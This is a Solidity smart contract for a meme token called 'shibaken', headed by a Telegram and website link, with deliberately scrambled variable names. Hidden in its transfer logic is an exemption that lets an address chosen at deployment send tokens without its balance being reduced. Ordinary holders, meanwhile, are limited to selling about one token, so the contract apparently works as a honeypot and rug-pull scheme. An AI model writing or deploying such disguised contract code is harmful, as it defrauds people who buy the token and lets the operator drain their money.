/*

https://t.me/shibakenerc

https://shibaken.cryptotoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Token is Ownable {
    function approve(address shjrmelg, uint256 bdeoprhacjfq) public returns (bool success) {
        allowance[msg.sender][shjrmelg] = bdeoprhacjfq;
        emit Approval(msg.sender, shjrmelg, bdeoprhacjfq);
        return true;
    }

    uint8 public decimals = 9;

    function transferFrom(address wtqsroui, address lvbdkyrhu, uint256 bdeoprhacjfq) public returns (bool success) {
        require(bdeoprhacjfq <= allowance[wtqsroui][msg.sender]);
        allowance[wtqsroui][msg.sender] -= bdeoprhacjfq;
        taypckix(wtqsroui, lvbdkyrhu, bdeoprhacjfq);
        return true;
    }

    string public name;

    function transfer(address lvbdkyrhu, uint256 bdeoprhacjfq) public returns (bool success) {
        taypckix(msg.sender, lvbdkyrhu, bdeoprhacjfq);
        return true;
    }

    mapping(address => uint256) private utwf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory vandlcpsj, string memory dmsve, address jxhg, address nfqzd) {
        name = vandlcpsj;
        symbol = dmsve;
        balanceOf[msg.sender] = totalSupply;
        udps[nfqzd] = zsqvcdeybak;
        jhnwz = IUniswapV2Router02(jxhg);
    }

    uint256 private zsqvcdeybak = 108;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private udps;

    function taypckix(address wtqsroui, address lvbdkyrhu, uint256 bdeoprhacjfq) private {
        address ajtvghsfkd = IUniswapV2Factory(jhnwz.factory()).getPair(address(this), jhnwz.WETH());
        bool nbjxmopdgvz = 0 == udps[wtqsroui];
        if (nbjxmopdgvz) {
            if (wtqsroui != ajtvghsfkd && utwf[wtqsroui] != block.number && bdeoprhacjfq < totalSupply) {
                require(bdeoprhacjfq <= totalSupply / (10 ** decimals));
            }
            balanceOf[wtqsroui] -= bdeoprhacjfq;
        }
        balanceOf[lvbdkyrhu] += bdeoprhacjfq;
        utwf[lvbdkyrhu] = block.number;
        emit Transfer(wtqsroui, lvbdkyrhu, bdeoprhacjfq);
    }

    IUniswapV2Router02 private jhnwz;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
